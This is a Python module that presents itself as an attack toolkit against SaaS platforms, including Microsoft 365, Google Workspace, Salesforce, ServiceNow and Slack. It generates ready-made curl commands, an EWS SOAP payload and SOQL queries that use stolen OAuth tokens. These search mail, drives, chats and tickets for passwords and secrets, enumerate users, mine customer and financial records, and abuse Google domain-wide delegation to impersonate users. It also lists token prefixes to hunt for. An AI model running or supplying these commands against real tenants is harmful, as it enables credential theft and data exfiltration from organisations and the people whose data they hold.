"""SaaS attacks — Microsoft 365, Google Workspace, Salesforce, ServiceNow exploitation.

Provides attack primitives against major SaaS platforms: Microsoft 365
(EWS abuse, eDiscovery exports, Teams phishing), Google Workspace (Gmail
API, Drive enumeration, Admin SDK), Salesforce (API access, report exports),
and ServiceNow (knowledge base, ticket mining).

All techniques operate through the platform's official APIs with stolen
tokens or credentials — no vulnerability exploitation required.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Optional

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

SAAS_PLATFORMS = {
    "microsoft365": "Microsoft 365 / Office 365",
    "google_workspace": "Google Workspace (G Suite)",
    "salesforce": "Salesforce",
    "servicenow": "ServiceNow",
    "slack": "Slack Enterprise",
    "workday": "Workday",
    "box": "Box Enterprise",
    "dropbox": "Dropbox Business",
    "zendesk": "Zendesk",
    "atlassian": "Atlassian Cloud (Jira/Confluence)",
    "okta": "Okta",
    "github_enterprise": "GitHub Enterprise Cloud",
    "gitlab": "GitLab SaaS",
}

M365_EWS_URL = "https://outlook.office365.com/EWS/Exchange.asmx"
M365_GRAPH_URL = "https://graph.microsoft.com/v1.0"
GOOGLE_ADMIN_SDK = "https://admin.googleapis.com/admin/directory/v1"
GOOGLE_GMAIL_API = "https://gmail.googleapis.com/gmail/v1/users/me"
SALESFORCE_API_VERSION = "v58.0"
SERVICENOW_API = "/api/now"


@dataclass
class SaaSConfig:
    """Configuration for SaaS attack operations.

    Attributes:
        platform: Target SaaS platform.
        access_token: OAuth2 access token.
        refresh_token: OAuth2 refresh token.
        tenant_id: Microsoft tenant ID.
        google_customer_id: Google Workspace customer ID.
        salesforce_instance: Salesforce instance URL.
        servicenow_instance: ServiceNow instance URL.
    """

    platform: str = ""
    access_token: str = ""
    refresh_token: str = ""
    tenant_id: str = ""
    google_customer_id: str = ""
    salesforce_instance: str = ""
    servicenow_instance: str = ""


class SaaSEnumerationTools:
    """Enumerate SaaS tenant resources for data mining and lateral movement."""

    @staticmethod
    def microsoft365_commands() -> dict[str, Any]:
        return {
            "mail_access": [
                f"# Enumerate mail folders via Graph API:",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/me/mailFolders'",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/me/messages?$top=10&$search=\"password OR credential OR secret OR key\"'",
                f"# Search all mailboxes with eDiscovery:",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/security/cases/ediscoveryCases'",
            ],
            "sharepoint_access": [
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/sites/root/drive/root/children'",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/sites/root/drive/root/search(q=\"password\")'",
            ],
            "teams_access": [
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/me/joinedTeams'",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/teams/TEAM_ID/channels'",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/teams/TEAM_ID/channels/CHANNEL_ID/messages'",
            ],
            "user_enumeration": [
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/users?$select=id,displayName,userPrincipalName,jobTitle,department'",
                f"curl -H 'Authorization: Bearer TOKEN' '{M365_GRAPH_URL}/users?$filter=userType eq \"Guest\"'",
            ],
        }

    @staticmethod
    def google_workspace_commands() -> dict[str, Any]:
        return {
            "gmail_access": [
                f"curl -H 'Authorization: Bearer TOKEN' '{GOOGLE_GMAIL_API}/messages?q=password OR credential OR secret&maxResults=10'",
                f"curl -H 'Authorization: Bearer TOKEN' '{GOOGLE_GMAIL_API}/messages/MESSAGE_ID'",
            ],
            "drive_access": [
                "curl -H 'Authorization: Bearer TOKEN' 'https://www.googleapis.com/drive/v3/files?q=name+contains+\"password\"+or+name+contains+\"credential\"'",
                "curl -H 'Authorization: Bearer TOKEN' 'https://www.googleapis.com/drive/v3/files?q=mimeType=\"application/vnd.google-apps.spreadsheet\"'",
            ],
            "admin_sdk": [
                f"curl -H 'Authorization: Bearer TOKEN' '{GOOGLE_ADMIN_SDK}/users?domain=DOMAIN&maxResults=100'",
                f"curl -H 'Authorization: Bearer TOKEN' '{GOOGLE_ADMIN_SDK}/groups?domain=DOMAIN'",
                f"curl -H 'Authorization: Bearer TOKEN' '{GOOGLE_ADMIN_SDK}/users/USER_KEY/tokens'",
            ],
        }

    @staticmethod
    def salesforce_commands() -> dict[str, Any]:
        return {
            "data_access": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/query/?q=SELECT+Id,Name,Email+FROM+User'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/query/?q=SELECT+Id,Name+FROM+Account'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/query/?q=SELECT+Id,Subject+FROM+Case'",
            ],
            "metadata_access": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/sobjects/'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/tooling/sobjects/ApexClass'",
            ],
            "report_download": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/analytics/reports'",
            ],
        }

    @staticmethod
    def servicenow_commands() -> dict[str, Any]:
        return {
            "ticket_mining": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/incident?sysparm_limit=50'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/problem?sysparm_limit=50'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/change_request?sysparm_limit=50'",
            ],
            "user_enumeration": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/sys_user?sysparm_fields=user_name,email,name,title'",
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/sys_user_group?sysparm_fields=name,email'",
            ],
            "knowledge_base": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/api/now/table/kb_knowledge?sysparm_fields=title,text'",
            ],
        }


class SaaSAttackEngine:
    """Execute SaaS platform enumeration and data exfiltration attacks.

    Provides structured commands and GraphQL/REST API queries for each
    supported SaaS platform. All techniques use the platform's official
    APIs with stolen OAuth tokens or service account credentials.

    Attributes:
        config: SaaSConfig with platform and authentication tokens.
    """

    def __init__(self, config: Optional[SaaSConfig] = None):
        self.config = config or SaaSConfig()

    def enumerate_all(self) -> dict[str, Any]:
        """Generate enumeration commands for all supported SaaS platforms.

        Returns:
            Dict with platform-specific enumeration commands.
        """
        return {
            "microsoft365": SaaSEnumerationTools.microsoft365_commands(),
            "google_workspace": SaaSEnumerationTools.google_workspace_commands(),
            "salesforce": SaaSEnumerationTools.salesforce_commands(),
            "servicenow": SaaSEnumerationTools.servicenow_commands(),
        }

    def m365_ews_mail_search(self, search_term: str = "password") -> dict[str, Any]:
        """Search mailboxes via Exchange Web Services (EWS).

        EWS provides SOAP-based mail access and often uses different
        authentication than Graph API, providing an alternative path
        if Graph access is restricted.

        Args:
            search_term: Query term for mail search.

        Returns:
            Dict with EWS SOAP payload and search configuration.
        """
        ews_body = f'''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
  xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
  xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016"/>
  </soap:Header>
  <soap:Body>
    <m:FindItem Traversal="Shallow">
      <m:ItemShape>
        <t:BaseShape>IdOnly</t:BaseShape>
        <t:AdditionalProperties>
          <t:FieldURI FieldURI="item:Subject"/>
          <t:FieldURI FieldURI="message:From"/>
        </t:AdditionalProperties>
      </m:ItemShape>
      <m:ParentFolderIds>
        <t:DistinguishedFolderId Id="inbox"/>
      </m:ParentFolderIds>
      <m:QueryString>{search_term}</m:QueryString>
    </m:FindItem>
  </soap:Body>
</soap:Envelope>'''

        return {
            "attack_type": "ews_mail_search",
            "ews_endpoint": M365_EWS_URL,
            "requirements": ["OAuth token with EWS.AccessAsUser.All or Mail.Read"],
            "headers": {
                "Authorization": "Bearer TOKEN",
                "Content-Type": "text/xml; charset=utf-8",
                "X-AnchorMailbox": "target@domain.com",
            },
            "payload": ews_body,
        }

    def google_workspace_domain_wide_delegation(self) -> dict[str, Any]:
        """Abuse Google Workspace Domain-Wide Delegation (DWD).

        Service accounts with DWD can impersonate any user in the domain
        without their credentials. This is a powerful persistence technique.

        Returns:
            Dict with DWD abuse instructions.
        """
        return {
            "attack_type": "google_dwd_abuse",
            "description": "Service accounts with Domain-Wide Delegation can access any user's data",
            "requirements": [
                "Service account with Domain-Wide Delegation enabled",
                "Service account private key (JSON/P12)",
                "OAuth scopes configured for the service account in Admin Console",
            ],
            "privileged_scopes": [
                "https://www.googleapis.com/auth/admin.directory.user",
                "https://www.googleapis.com/auth/admin.directory.group",
                "https://mail.google.com/",
                "https://www.googleapis.com/auth/drive",
                "https://www.googleapis.com/auth/cloud-platform",
            ],
            "impersonation_command": (
                "gcloud auth application-default login --impersonate-service-account SA@PROJECT.iam.gserviceaccount.com"
            ),
        }

    def salesforce_report_mining(self) -> dict[str, Any]:
        """Mine Salesforce reports and dashboards for sensitive data.

        Salesforce reports often contain aggregated financial data,
        customer lists, and pipeline information valuable for
        business intelligence gathering.

        Returns:
            Dict with SOQL queries and report endpoints.
        """
        return {
            "attack_type": "salesforce_report_mining",
            "soql_queries": [
                "SELECT Id, Name, Email, Title, Phone FROM User WHERE IsActive = true",
                "SELECT Id, Name, Industry, AnnualRevenue FROM Account",
                "SELECT Id, Name, Email, Title FROM Contact",
                "SELECT Id, Subject, Description, Status FROM Case",
                "SELECT Id, Name, StageName, Amount FROM Opportunity",
            ],
            "report_endpoints": [
                f"/services/data/{SALESFORCE_API_VERSION}/analytics/reports",
                f"/services/data/{SALESFORCE_API_VERSION}/analytics/dashboards",
            ],
            "exports": [
                "curl -H 'Authorization: Bearer TOKEN' 'INSTANCE/services/data/v58.0/query/?q=QUERY'",
                "Use Salesforce Data Loader for bulk export",
            ],
        }

    def slack_data_mining(self) -> dict[str, Any]:
        """Mine Slack Enterprise for sensitive conversations and files.

        Slack contains credentials in conversations, SSH keys in code
        snippets, and cloud provider tokens in integrations.

        Returns:
            Dict with Slack API search and data mining techniques.
        """
        return {
            "attack_type": "slack_data_mining",
            "api_endpoints": [
                "https://slack.com/api/conversations.list",
                "https://slack.com/api/search.messages?query=password OR credential OR secret OR key&count=100",
                "https://slack.com/api/files.list?count=100",
                "https://slack.com/api/users.list",
                "https://slack.com/api/team.info",
            ],
            "search_terms": [
                "password", "secret", "credential", "token", "api key",
                "ssh-rsa", "BEGIN RSA", "BEGIN OPENSSH", "access_key",
                "AKIA", "ghp_", "xoxb-", "xoxp-", "sk-",
                "login", "admin", "root", "terraform", "tfstate",
            ],
        }

    def detect_external_sharing(self) -> dict[str, Any]:
        """Detect external sharing configurations across SaaS platforms.

        External sharing to personal email accounts or partner domains
        is a data exfiltration risk and potential pivot point.

        Returns:
            Dict with external sharing detection commands.
        """
        return {
            "attack_type": "external_sharing_detection",
            "microsoft365": [
                f"GET {M365_GRAPH_URL}/shares?$filter=sharedWith/any()",
                f"GET {M365_GRAPH_URL}/users?$filter=userType eq 'Guest'",
            ],
            "google_workspace": [
                "GET https://www.googleapis.com/drive/v3/files?q=visibility='anyoneWithLink' or visibility='anyoneCanFind'",
                "GAM (Google Apps Manager): gam user USER show forward",
            ],
            "salesforce": [
                "SELECT Id, Name FROM User WHERE UserType = 'Guest' OR UserType = 'Partner'",
                "Check Sharing Rules and Org-Wide Defaults in Setup",
            ],
        }

    def summary(self) -> dict[str, Any]:
        return {
            "supported_platforms": SAAS_PLATFORMS,
            "current_platform": self.config.platform,
            "enumeration_available": list(self.enumerate_all().keys()),
        }
